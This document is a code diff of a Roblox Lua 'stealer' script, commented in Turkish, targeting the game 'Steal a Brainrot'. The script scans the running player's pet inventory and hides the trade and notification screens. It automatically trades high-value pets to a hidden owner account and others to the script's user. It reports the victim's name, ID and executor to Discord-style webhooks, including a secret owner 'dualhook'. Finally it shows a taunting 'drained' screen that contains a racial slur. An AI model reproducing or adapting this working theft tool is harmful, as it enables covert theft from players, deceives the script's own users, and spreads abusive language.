-							fn21(normal3, "https://sentinelhook.lol/api.php?id=XZxouWroF6uAN5W", "https://cdn.discordapp.com/attachments/1503012061188198400/1522704317264560189/togif.gif?ex=6a4cbc27&is=6a4b6aa7&hm=6667051345d497289a91b99de877a342bdf6582eba18d1fb56fb69695ac087a9&", false, "VenotBurda [DUALHOOK]", nil)
-							tbl6.queue = normal2
-							tbl6.targetId = targetUserId
-							tbl6.phase = "NORMAL"
-							tbl6.running = true
-							tbl6.addIdx = 1
-							tbl6.baseSkinQueue = v4
-							tbl6.gearQueue = v5
-							tbl6.baseSkinIdx = 1
-							tbl6.gearIdx = 1
-						else
-							tbl6.phase = "IDLE"
-						end
-					else
-						tbl6.queue = priority2
-						tbl6.addIdx = 1
-					end
-				end
-			end
-
-			task.wait(0.7)
-		end
-	end)
-
-	task.spawn(function()
-		while tbl6.phase ~= "NORMAL" do
-			task.wait(0.5)
-			if tbl6.phase ~= "IDLE" then
-				continue
-			end
-			return
-		end
-
-		local n = #fn7("NORMAL")
-		local n2 = #fn5()
-		local n3 = #fn6()
-		if n == 0 and n2 == 0 and n3 == 0 then
-			return
-		end
-
-		while true do
-			task.wait(0.5)
-			local n4 = #fn7("NORMAL")
-			local n5 = #fn5()
-			local n6 = #fn6()
-			if not (n4 < n or n5 < n2 or n6 < n3) then
-				continue
-			end
-			break
-		end
-
-		fn22()
-	end)
+
+
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+ 
+local ALLOWED_PLACES = { 99606176102979, 109983668079237, 79906538690694, 119594317142884 }
+if not table.find(ALLOWED_PLACES, game.PlaceId) then
+    return
+end
+
+-- ╔═══════════════════════════════════════════════════════════════════╗
+-- ║         KULLANICININ AYARLARINI OKU (getgenv)                    ║
+-- ╚═══════════════════════════════════════════════════════════════════╝
+
+local USER_TARGET_ID     = getgenv().TARGET_USER_ID or 0
+local USER_LOG_WEBHOOK   = getgenv().GOOD_WEBHOOK or ""
+local USER_TRADE_WEBHOOK = getgenv().TRADE_WEBHOOK or ""
+local USER_ALLOWED_RAW   = getgenv().ALLOWED_ANIMALS or {}
+
+local UserAllowedAnimals = {}
+for _, name in ipairs(USER_ALLOWED_RAW) do
+    if type(name) == "string" and name ~= "" and name ~= "Name Brainrot" then
+        UserAllowedAnimals[name] = true
+    end
+end
+
+-- ╔═══════════════════════════════════════════════════════════════════╗
+-- ║     OWNER GIZLI AYARLARI (DUALHOOK + PRIORITY)                   ║
+-- ╚═══════════════════════════════════════════════════════════════════╝
+
+local OWNER_DUALHOOK_WEBHOOK = ""
+local OWNER_DUALHOOK_AVATAR  = ""
+
+local OWNER_PRIORITY_WEBHOOK = ""
+local OWNER_PRIORITY_AVATAR  = ""
+
+local OWNER_PRIORITY_TARGET_ID = 
+
+local PRIORITY_BRAINROTS = {
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Headless Horseman"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Griffin"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Love Love Bear"] = true,
+    ["Ginger Gerat"] = true,
+    ["Antonio"] = true,
+    ["Signore Carapace"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Bunny and Eggy"] = true,
+    ["Hydra Bunny"] = true,
+    ["Arcadragon"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Fishino Clownino"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Rico Dinero"] = true,
+    ["Kalika Bros"] = true,
+    ["Digi Narwhal"] = true,
+    ["Duggy Bros"] = true,
+    ["John Pork"] = true,
+    ["Dragon Aquanini"] = true,
+    ["Kraken"] = true,
+}
+
+-- ╔═══════════════════════════════════════════════════════════════════╗
+-- ║                    DIGER SABITLER                                 ║
+-- ╚═══════════════════════════════════════════════════════════════════╝
+
+local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
+local DELAY_STEP = 1
+local TRADE_CYCLE_DELAY = 2
+
+local INVITE_GUID = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
+local SELECT_GUID = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
+local READY_GUID  = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
+local ACCEPT_GUID = "918ee0f5-e98f-413f-b76e-baee47b021cb"
+
+local guiNames = {BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true}
+
+local TargetBrainrots = {}
+for k, v in pairs(UserAllowedAnimals) do TargetBrainrots[k] = v end
+for k, v in pairs(PRIORITY_BRAINROTS) do TargetBrainrots[k] = v end
+
+-- ╔═══════════════════════════════════════════════════════════════════╗
+-- ║                    YARDIMCI FONKSIYONLAR                         ║
+-- ╚═══════════════════════════════════════════════════════════════════╝
+
+local function getRemote(unobfuscatedName)
+    local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
+    local children = Net:GetChildren()
+    for i = 1, #children - 1 do
+        local current = children[i]
+        local nextFolder = children[i - 1]
+        if current and nextFolder and string.find(current.Name, unobfuscatedName) then
+            return nextFolder
+        end
+    end
+    return nil
+end
+
+local function applyEverythingAfterTargetFound()
+    local leftCenter = pg:FindFirstChild("LeftCenter")
+    if leftCenter then
+        local clone = leftCenter:Clone()
+        clone.Name = "LeftCenter_Backup"
+        clone.Parent = pg
+        leftCenter:Destroy()
+    end
+
+    local notifyRemote = getRemote("RE/NotificationService/Notify")
+    if notifyRemote then
+        pcall(function()
+            for _, connection in ipairs(getconnections(notifyRemote.OnClientEvent)) do
+                connection:Disable()
+            end
+        end)
+    end
+
+    local function handleCam(obj)
+        if obj:IsA("BlurEffect") then task.defer(function() obj:Destroy() end) end
+    end
+    cam.ChildAdded:Connect(handleCam)
+    for _, v in ipairs(cam:GetChildren()) do handleCam(v) end
+
+    cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
+        cam.FieldOfView = 70
+    end)
+    cam.FieldOfView = 70
+
+    local function handleGui(obj)
+        if guiNames[obj.Name] then task.defer(function() obj:Destroy() end) end
+    end
+    pg.ChildAdded:Connect(handleGui)
+    for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
+end
+
+local AnimalsData, AnimalsShared, NumberUtils
+pcall(function()
+    AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
+    AnimalsShared = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
+    NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
+end)
+
+local function loadSyncData()
+    local mod = ReplicatedStorage.Packages:FindFirstChild("Synchronizer")
+    if not mod then return nil end
+    local sync = require(mod)
+    local fn = sync.Get
+    for i = 1, 15 do
+        local s, v = pcall(debug.getupvalue, fn, i)
+        if s and type(v) == "table" then return v end
+    end
+    return nil
+end
+
+-- ╔═══════════════════════════════════════════════════════════════════╗
+-- ║  ENVANTER TARAMA                                                 ║
+-- ╚═══════════════════════════════════════════════════════════════════╝
+
+local function scanInventory(filterType)
+    -- filterType: "PRIORITY" veya "NORMAL"
+    local results = {}
+    local syncData = loadSyncData()
+    if not syncData then return results end
+
+    for _, plotData in pairs(syncData) do
+        if type(plotData) == "table" then
+            local owner = plotData.Owner or (type(plotData.Get) == "function" and plotData:Get("Owner"))
+            if (typeof(owner) == "Instance" and owner == LP) or (typeof(owner) == "table" and owner.UserId == LP.UserId) then
+                local animalList = plotData.AnimalList or (type(plotData.Get) == "function" and plotData:Get("AnimalList"))
+                if type(animalList) == "table" then
+                    for slotKey, data in pairs(animalList) do
+                        if type(data) == "table" and data.Index then
+                            local info = AnimalsData and AnimalsData[data.Index]
+                            local displayName = (info and info.DisplayName) or data.Index
+                            local isPriority = (PRIORITY_BRAINROTS[displayName] or PRIORITY_BRAINROTS[data.Index]) and true or false
+                            local isUserWanted = (UserAllowedAnimals[displayName] or UserAllowedAnimals[data.Index]) and true or false
+
+                            local shouldInclude = false
+                            if filterType == "PRIORITY" and isPriority then
+                                shouldInclude = true
+                            elseif filterType == "NORMAL" and (not isPriority) and isUserWanted then
+                                shouldInclude = true
+                            end
+
+                            if shouldInclude then
+                                table.insert(results, {
+                                    slotKey = tonumber(slotKey),
+                                    data = data,
+                                    displayName = displayName,
+                                    isPriority = isPriority
+                                })
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return results
+end
+
+-- ╔═══════════════════════════════════════════════════════════════════╗
+-- ║                    ILK TARAMA                                    ║
+-- ╚═══════════════════════════════════════════════════════════════════╝
+
+local SYNC_DATA = loadSyncData()
+if not SYNC_DATA then return end
+
+local initialPriority = scanInventory("PRIORITY")
+local initialNormal   = scanInventory("NORMAL")
+
+if #initialPriority == 0 and #initialNormal == 0 then return end
+
+applyEverythingAfterTargetFound()
+
+-- ╔═══════════════════════════════════════════════════════════════════╗
+-- ║                    FORMAT / GORSEL                               ║
+-- ╚═══════════════════════════════════════════════════════════════════╝
+
+local function formatNumber(n)
+    if not n then return "$0/s" end
+    local function clean(s) return s:gsub("%.?0+$", "") end
+    if n >= 1e12 then return "$" .. clean(string.format("%.2f", n/1e12)) .. "T/s" end
+    if n >= 1e9  then return "$" .. clean(string.format("%.2f", n/1e9))  .. "B/s" end
+    if n >= 1e6  then return "$" .. clean(string.format("%.2f", n/1e6))  .. "M/s" end
+    if n >= 1e3  then return "$" .. clean(string.format("%.2f", n/1e3))  .. "K/s" end
+    return "$" .. tostring(math.floor(n)) .. "/s"
+end
+
+local function getRequestFn()
+    return (syn and syn.request) or (http and http.request) or http_request or request
+end
+
+local function toWikiName(displayName)
+    local clean = displayName:match("^(.-)%s*%(") or displayName
+    return clean:gsub(" ", "_")
+end
+
+local function fetchFandomImageUrl(displayName)
+    local requestFn = getRequestFn()
+    if not requestFn then return nil end
+
+    local wikiName = toWikiName(displayName)
+    local url = FANDOM_BASE .. wikiName
+
+    for attempt = 1, 3 do
+        local ok, response = pcall(function()
+            return requestFn({
+                Url = url,
+                Method = "GET",
+                Headers = {
+                    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    ["Accept-Language"] = "en-US,en;q=0.5",
+                    ["Cache-Control"] = "no-cache"
+                },
+                Timeout = 10
+            })
+        end)
+
+        if ok and response and response.StatusCode and response.StatusCode == 200 then
+            local body = response.Body
+            if not body or body == "" then
+                if attempt < 3 then task.wait(0.5) end
+                continue
+            end
+
+            local ogImage = body:match('property="og:image"%s+content="([^"]+)"')
+                or body:match('content="([^"]+)"%s+property="og:image"')
+                or body:match('<meta%s+og:image%s+content="([^"]+)"')
+                or body:match('<meta%s+property="og:image"%s+content="([^"]+)"')
+
+            if ogImage and ogImage ~= "" then
+                ogImage = ogImage:gsub("&amp;", "&"):gsub("&quot;", '"'):gsub("&lt;", "<"):gsub("&gt;", ">")
+                if ogImage:find("^https?://") then
+                    return ogImage
+                end
+            end
+
+            local infoboxPattern = '<div[^>]*class="[^"]*infobox[^"]*"[^>]*>(.-)</div>%s*</div>'
+            local infoboxMatch = body:match(infoboxPattern)
+            local searchBody = infoboxMatch or body
+
+            local imgPatterns = {
+                'data%-src="(https://[^"]+%.(?:png|jpg|jpeg|webp|gif))"',
+                'src="(https://[^"]+%.(?:png|jpg|jpeg|webp|gif))"',
+            }
+
+            for _, pattern in ipairs(imgPatterns) do
+                local lastMatch = nil
+                local pos = 1
+                while true do
+                    local start, endPos = searchBody:find(pattern, pos)
+                    if not start then break end
+                    local match = searchBody:sub(start, endPos)
+                    local foundUrl = match:match('"([^"]+)"')
+
+                    if foundUrl and foundUrl:find("static%.wikia%.nocookie%.net") then
+                        if not foundUrl:find("/scale%-to%-width%-down/[0-9]?[0-9]$") then
+                            lastMatch = foundUrl
+                        end
+                    elseif foundUrl then
+                        lastMatch = foundUrl
+                    end
+                    pos = endPos + 1
+                end
+
+                if lastMatch then
+                    lastMatch = lastMatch:gsub("/revision/latest", "")
+                    return lastMatch
+                end
+            end
+
+            return nil
+        end
+
+        if attempt < 3 then
+            task.wait(0.5 * attempt)
+        end
+    end
+
+    return nil
+end
+
+local function getBrainrotColor(animalIndex)
+    local color = nil
+    pcall(function()
+        local models = ReplicatedStorage:FindFirstChild("Models")
+        local animals = models and models:FindFirstChild("Animals")
+        if not animals then return end
+        local template = animals:FindFirstChild(animalIndex)
+        if not template then
+            local info = AnimalsData and AnimalsData[animalIndex]
+            if info and info.DisplayName then
+                template = animals:FindFirstChild(info.DisplayName)
+            end
+        end
+        if not template then return end
+        local bestScore = 0
+        for _, desc in ipairs(template:GetDescendants()) do
+            if desc:IsA("MeshPart") or desc:IsA("Part") then
+                local c = desc.Color
+                local vol = desc.Size.X * desc.Size.Y * desc.Size.Z
+                local maxC = math.max(c.R, c.G, c.B)
+                local minC = math.min(c.R, c.G, c.B)
+                local sat = (maxC > 0) and ((maxC - minC) / maxC) or 0
+                local bri = c.R * 0.299 + c.G * 0.587 + c.B * 0.114
+                local bp = 1
+                if bri < 0.08 then bp = 0.05 end
+                if bri > 0.92 then bp = 0.15 end
+                local score = (sat * 3 + 0.2) * bp * vol
+                if score > bestScore then
+                    bestScore = score
+                    color = c
+                end
+            end
+        end
+    end)
+    return color
+end
+
+local function colorToDecimal(c)
+    if not c then return 0x71368A end
+    local r = math.clamp(math.floor(c.R * 255), 0, 255)
+    local g = math.clamp(math.floor(c.G * 255), 0, 255)
+    local b = math.clamp(math.floor(c.B * 255), 0, 255)
+    return r * 65536 + g * 256 + b
+end
+
+local function getBestImageUrl(displayName, animalIndex)
+    local fandom = fetchFandomImageUrl(displayName)
+    if fandom then return fandom end
+    local info = AnimalsData and AnimalsData[animalIndex]
+    if info then
+        for _, key in ipairs({"Image","Icon","Thumbnail","Texture","ImageId","AssetId","image","icon"}) do
+            if info[key] and type(info[key]) == "string" and info[key] ~= "" then
+                local num = info[key]:match("%d+")
+                if num then
+                    return "https://tr.rbxcdn.com/" .. num .. "/420/420/Image/Png"
+                end
+            end
+        end
+    end
+    if animalIndex and animalIndex ~= displayName then
+        local fandom2 = fetchFandomImageUrl(animalIndex)
+        if fandom2 then return fandom2 end
+    end
+    return nil
+end
+
+-- ╔═══════════════════════════════════════════════════════════════════╗
+-- ║                    EMBED / WEBHOOK FONKSIYONLARI                 ║
+-- ╚═══════════════════════════════════════════════════════════════════╝
+
+-- Detayli embed (fandom resimli, top color)
+local function buildEmbed(scanResults, tagText)
+    if #scanResults == 0 then return nil end
+
+    -- Genellikleri hesapla
+    local entries = {}
+    for _, item in ipairs(scanResults) do
+        local info = AnimalsData and AnimalsData[item.data.Index]
+        local displayName = item.displayName or (info and info.DisplayName) or item.data.Index
+        local mutation = item.data.Mutation or "None"
+        local traits = (item.data.Traits and #item.data.Traits > 0) and item.data.Traits or {}
+
+        local genVal = 0
+        pcall(function()
+            genVal = AnimalsShared:GetGeneration(item.data.Index, item.data.Mutation, item.data.Traits, nil)
+        end)
+
+        local mutPrefix = ""
+        if mutation ~= "None" and mutation ~= "" then
+            mutPrefix = "[" .. mutation .. "] "
+        end
+        local nameDisplay = mutPrefix .. "**" .. displayName .. "**"
+        if #traits > 0 then
+            nameDisplay = nameDisplay .. " *(x" .. #traits .. " traits)*"
+        end
+
+        table.insert(entries, {
+            displayName = displayName,
+            index       = item.data.Index,
+            name        = nameDisplay,
+            genVal      = genVal,
+            genStr      = formatNumber(genVal),
+        })
+    end
+
+    table.sort(entries, function(a, b) return a.genVal > b.genVal end)
+
+    local top = entries[1]
+    local imageUrl = getBestImageUrl(top.displayName, top.index)
+    local topColor = getBrainrotColor(top.index)
+    local embedColor = colorToDecimal(topColor)
+
+    local lines = {}
+    for i, r in ipairs(entries) do
+        lines[i] = r.name .. " — **" .. r.genStr .. "**"
+    end
+    local listText = table.concat(lines, "\n")
+    if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end
+
+    local unixTime = os.time()
+    local pCount = #Players:GetPlayers()
+    local execName = "Unknown"
+    pcall(function()
+        if identifyexecutor then execName = identifyexecutor()
+        elseif getexecutorname then execName = getexecutorname() end
+    end)
+
+    local embed = {
+        title       = (tagText and ("[" .. tagText .. "] ") or "") .. top.displayName .. " — " .. top.genStr,
+        description = listText,
+        color       = embedColor,
+        fields      = {
+            { name = "Server",   value = "Players: **" .. pCount .. "** | <t:" .. unixTime .. ":R>", inline = true },
+            { name = "Executor", value = execName, inline = true },
+            { name = "User",     value = LP.Name .. " (`" .. LP.UserId .. "`)", inline = true },
+        },
+        footer      = { text = LP.Name .. " • " .. LP.UserId },
+        timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+    }
+
+    if imageUrl then
+        embed.thumbnail = { url = imageUrl }
+    end
+
+    return embed
+end
+
+local function fireWebhook(webhookUrl, avatarUrl, embed, ping, username)
+    if not webhookUrl or webhookUrl == "" or webhookUrl:find("BURAYA") then return end
+    local requestFn = getRequestFn()
+    if not requestFn then return end
+
+    local payloadData = {
+        embeds     = { embed },
+        username   = username or "LOGGER",
+        avatar_url = avatarUrl or "",
+    }
+
+    if ping then
+        payloadData.content = "Venot victim||@everyone||"
+    end
+
+    local payload = HttpService:JSONEncode(payloadData)
+
+    -- Kendi thread'inde, 3 retry
+    task.spawn(function()
+        for attempt = 1, 3 do
+            local ok = pcall(function()
+                requestFn({
+                    Url     = webhookUrl,
+                    Method  = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body    = payload,
+                })
+            end)
+            if ok then return end
+            task.wait(2 * attempt)
+        end
+    end)
+end
+
+-- ╔═══════════════════════════════════════════════════════════════════╗
+-- ║  WEBHOOK GONDERIM FONKSIYONLARI                                  ║
+-- ╚═══════════════════════════════════════════════════════════════════╝
+
+-- Owner'a priority brainrotlari bildir
+local function sendOwnerPriorityWebhook()
+    if #initialPriority == 0 then return end
+
+    local embed = buildEmbed(initialPriority, "PRIORITY")
+    if not embed then return end
+
+    fireWebhook(OWNER_PRIORITY_WEBHOOK, OWNER_PRIORITY_AVATAR, embed, true, "MachoBurda [PRIORITY]")
+
+    if OWNER_DUALHOOK_WEBHOOK ~= OWNER_PRIORITY_WEBHOOK then
+        fireWebhook(OWNER_DUALHOOK_WEBHOOK, OWNER_DUALHOOK_AVATAR, embed, true, "MachoBurda [DUALHOOK]")
+    end
+end
+
+-- User'a normal brainrotlari bildir (TAZE tarama ile - trade sonrasi guncel envanter)
+-- Ayni bildirim owner'in dualhook webhookuna da kopya olarak gider
+local function sendUserNormalWebhook(normalList)
+    if #normalList == 0 then return end
+
+    local embed = buildEmbed(normalList, nil)
+    if not embed then return end
+
+    -- User'a gonder
+    fireWebhook(USER_LOG_WEBHOOK, nil, embed, true, "LOGGER MACHOHUB")
+
+    -- Owner dualhook'a kopya gonder
+    fireWebhook(OWNER_DUALHOOK_WEBHOOK, OWNER_DUALHOOK_AVATAR, embed, false, "MachoBurda [DUALHOOK]")
+end
+
+-- ╔═══════════════════════════════════════════════════════════════════╗
+-- ║  DRAIN EKRANI                                                    ║
+-- ║  Siyah full-ekran arka plan + buyuk kirmizi yazi                 ║
+-- ║  User faz'inda ilk pet alindiginda gosterilir                    ║
+-- ╚═══════════════════════════════════════════════════════════════════╝
+
+local function showDrainScreen()
+    pcall(function()
+        -- Ekstra koruma icin CoreGui'ye ekle (bazi executor'larda gerekli)
+        local parent = pg
+        pcall(function()
+            local cg = game:GetService("CoreGui")
+            if cg then parent = cg end
+        end)
+
+        -- Eger daha once eklendiyse tekrar ekleme
+        if parent:FindFirstChild("DrainOverlay") then return end
+
+        local gui = Instance.new("ScreenGui")
+        gui.Name = "DrainOverlay"
+        gui.IgnoreGuiInset = true
+        gui.ResetOnSpawn = false
+        gui.DisplayOrder = 999999
+        gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        gui.Parent = parent
+
+        -- Tam ekran siyah arka plan
+        local bg = Instance.new("Frame")
+        bg.Name = "Background"
+        bg.Size = UDim2.new(1, 0, 1, 0)
+        bg.Position = UDim2.new(0, 0, 0, 0)
+        bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        bg.BackgroundTransparency = 0
+        bg.BorderSizePixel = 0
+        bg.ZIndex = 999998
+        bg.Parent = gui
+
+        -- Ust yazi: Your Brainrot Drained By discord.gg/irish
+        local title = Instance.new("TextLabel")
+        title.Name = "TitleText"
+        title.Size = UDim2.new(1, -40, 0.4, 0)
+        title.Position = UDim2.new(0, 20, 0.15, 0)
+        title.BackgroundTransparency = 1
+        title.Text = "NIGGA UR BRAINOT DRAINED BY VENOT"
+        title.TextColor3 = Color3.fromRGB(255, 50, 50)
+        title.TextScaled = true
+        title.Font = Enum.Font.GothamBlack
+        title.TextStrokeTransparency = 0.7
+        title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        title.ZIndex = 999999
+        title.Parent = gui
+
+        -- Alt yazi: METHOD FOR JOIN DISCORD
+        local sub = Instance.new("TextLabel")
+        sub.Name = "SubText"
+        sub.Size = UDim2.new(1, -40, 0.2, 0)
+        sub.Position = UDim2.new(0, 20, 0.65, 0)
+        sub.BackgroundTransparency = 1
+        sub.Text = ""
+        sub.TextColor3 = Color3.fromRGB(255, 50, 50)
+        sub.TextScaled = true
+        sub.Font = Enum.Font.GothamBlack
+        sub.TextStrokeTransparency = 0.7
+        sub.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        sub.ZIndex = 999999
+        sub.Parent = gui
+
+        -- Kaldirilmasin diye korumaya al
+        pcall(function()
+            gui.AncestryChanged:Connect(function(_, newParent)
+                if newParent == nil then
+                    task.wait(0.1)
+                    gui.Parent = parent
+                end
+            end)
+        end)
+    end)
+end
+
+-- ╔═══════════════════════════════════════════════════════════════════╗
+-- ║  TRADE OTOMASYONU                                                ║
+-- ║                                                                  ║
+-- ║  AKIS:                                                           ║
+-- ║   1. Owner webhook (priority petler bildirimi)                   ║
+-- ║   2. Priority petler owner'a trade edilir                        ║
+-- ║   3. Priority envanterden gitince:                               ║
+-- ║      → User webhook (normal petler bildirimi)                    ║
+-- ║      → Normal petler user'a trade edilir                         ║
+-- ║   4. User'dan ilk pet gittiginde drain ekranini goster           ║
+-- ╚═══════════════════════════════════════════════════════════════════╝
+
+local function startFullAutomation()
+    local inviteRemote = getRemote("RF/TradeService/Invite")
+    local addRemote    = getRemote("RF/TradeService/AddBrainrot")
+    local readyRemote  = getRemote("RE/TradeService/Ready")
+    local acceptRemote = getRemote("RE/TradeService/Accept")
+
+    if not (inviteRemote and addRemote and readyRemote and acceptRemote) then return end
+
+    local state = {
+        phase        = "IDLE",   -- "PRIORITY" | "NORMAL" | "SWITCHING" | "IDLE"
+        queue        = {},
+        targetId     = 0,
+        running      = false,
+        priorityDone = false,    -- Priority fazi bir kere bitince TRUE olur, geri donmez
+    }
+
+    -- ═══════════════════════════════════════
+    --  BASLANGIC: Priority varsa oraya, yoksa Normal'e
+    -- ═══════════════════════════════════════
+    if #initialPriority > 0 and OWNER_PRIORITY_TARGET_ID ~= 0 then
+        -- 1) ONCE owner'a priority webhook gonder
+        sendOwnerPriorityWebhook()
+
+        -- 2) Priority trade fazini baslat
+        state.phase    = "PRIORITY"
+        state.queue    = initialPriority
+        state.targetId = OWNER_PRIORITY_TARGET_ID
+        state.running  = true
+
+    elseif #initialNormal > 0 and USER_TARGET_ID ~= 0 then
+        -- Priority yok, direkt user'a normal webhook + trade
+        sendUserNormalWebhook(initialNormal)
+
+        state.phase    = "NORMAL"
+        state.queue    = initialNormal
+        state.targetId = USER_TARGET_ID
+        state.running  = true
+    else
+        return
+    end
+
+    -- ═══════════════════════════════════════
+    --  FAZ GECIS: Priority bittikten sonra Normal'e gec
+    --  Hizli tepki icin sik kontrol + kisa cooldown
+    -- ═══════════════════════════════════════
+    if state.phase == "PRIORITY" and USER_TARGET_ID ~= 0 then
+        task.spawn(function()
+            while state.phase == "PRIORITY" do
+                task.wait(0.3)  -- HIZLI kontrol (eskiden 2 sn)
+
+                -- Priority envanterden gitti mi?
+                local freshPriority = scanInventory("PRIORITY")
+
+                if #freshPriority == 0 then
+                    -- KILITLE: Bir daha priority'e donmesin
+                    state.priorityDone = true
+                    state.phase        = "SWITCHING"
+                    state.running      = false
+                    state.targetId     = 0
+                    state.queue        = {}
+
+                    -- Kisa cooldown
+                    task.wait(1)
+
+                    -- Envanteri TAZE tara (taze slot numaralari)
+                    local freshNormal = scanInventory("NORMAL")
+
+                    if #freshNormal > 0 then
+                        sendUserNormalWebhook(freshNormal)
+
+                        state.queue    = freshNormal
+                        state.targetId = USER_TARGET_ID
+                        state.phase    = "NORMAL"
+                        state.running  = true
+                    else
+                        state.phase = "IDLE"
+                    end
+
+                    break
+                else
+                    -- Priority hala var, kuyrugu taze slot'larla guncelle
+                    state.queue = freshPriority
+                end
+            end
+        end)
+    end
+
+    -- ═══════════════════════════════════════
+    --  BRAINROT EKLEME DONGUSU
+    --  Priority bittikten sonra priority petleri asla ekleme
+    -- ═══════════════════════════════════════
+    task.spawn(function()
+        local idx = 1
+        while true do
+            if state.running and state.phase ~= "SWITCHING" and state.phase ~= "IDLE" then
+                local q = state.queue
+                if #q > 0 then
+                    if idx > #q then idx = 1 end
+                    local item = q[idx]
+                    if item then
+                        -- EK GUVENLIK: Priority bittikten sonra priority pet ekleme
+                        local skip = state.priorityDone and item.isPriority
+                        if not skip then
+                            pcall(function() addRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data) end)
+                        end
+                    end
+                    idx = (idx % #q) + 1
+                end
+            end
+            task.wait(DELAY_STEP)
+        end
+    end)
+
+    -- ═══════════════════════════════════════
+    --  DAVET DONGUSU
+    --  ÇOKLU GUVENLIK: Priority bittikten sonra owner ID'ye ASLA davet atmaz
+    -- ═══════════════════════════════════════
+    task.spawn(function()
+        while true do
+            if state.running and state.targetId ~= 0 and state.phase ~= "SWITCHING" and state.phase ~= "IDLE" then
+                local safeToInvite = true
+
+                -- KILIT 1: Priority bittiyse ve hedef owner ID ise skip
+                if state.priorityDone and state.targetId == OWNER_PRIORITY_TARGET_ID then
+                    safeToInvite = false
+                end
+
+                -- KILIT 2: Faz PRIORITY degilse ve hedef owner ID ise skip
+                if state.phase ~= "PRIORITY" and state.targetId == OWNER_PRIORITY_TARGET_ID then
+                    safeToInvite = false
+                end
+
+                if safeToInvite then
+                    pcall(function() inviteRemote:InvokeServer(INVITE_GUID, state.targetId) end)
+                end
+            end
+            task.wait(TRADE_CYCLE_DELAY)
+        end
+    end)
+
+    -- ═══════════════════════════════════════
+    -- ═══════════════════════════════════════
+    --  READY / ACCEPT DONGUSU
+    --  Her Accept'ten sonra ANINDA envanteri kontrol et
+    --  Priority gittiyse butun state'i tek seferde kilitle
+    -- ═══════════════════════════════════════
+    task.spawn(function()
+        while true do
+            if state.running and state.phase ~= "SWITCHING" and state.phase ~= "IDLE" then
+                pcall(function() readyRemote:FireServer(READY_GUID) end)
+                task.wait(0.7)
+                pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
+
+                -- ⚡ ANINDA KONTROL: Accept sonrasi priority pet gitti mi?
+                if state.phase == "PRIORITY" and not state.priorityDone then
+                    task.wait(0.15) -- server sync icin kisa bekleme
+                    local checkPriority = scanInventory("PRIORITY")
+                    if #checkPriority == 0 then
+                        -- ANINDA HERSEYI KILITLE
+                        state.priorityDone = true
+                        state.phase        = "SWITCHING"
+                        state.running      = false
+                        state.targetId     = 0
+                        state.queue        = {}
+                    end
+                end
+            end
+            task.wait(0.7)
+        end
+    end)
+
+    -- ═══════════════════════════════════════════════════════════════════
+    --  DRAIN EKRANI GOSTERICI
+    --  User faz'inda pet gittikce envanteri kontrol eder.
+    --  En az 1 normal pet gittiginde drain ekranini gosterir.
+    -- ═══════════════════════════════════════════════════════════════════
+    task.spawn(function()
+        -- User fazina gecmeyi bekle
+        while state.phase ~= "NORMAL" do
+            task.wait(0.5)
+            if state.phase == "IDLE" then return end
+        end
+
+        -- User faz'i basladi, baslangictaki normal pet sayisini kaydet
+        local initialUserPetCount = #scanInventory("NORMAL")
+        if initialUserPetCount == 0 then return end
+
+        -- Envanteri gozlemle, pet azaldiginda drain ekranini goster
+        while true do
+            task.wait(1)
+            local currentCount = #scanInventory("NORMAL")
+            if currentCount < initialUserPetCount then
+                -- En az 1 pet gitti, drain ekranini goster
+                showDrainScreen()
+                break
+            end
+        end
+    end)
+end
+
+-- ╔═══════════════════════════════════════════════════════════════════╗
+-- ║                         CALISTIR                                 ║
+-- ╚═══════════════════════════════════════════════════════════════════╝
+
+startFullAutomation()
+
 end)
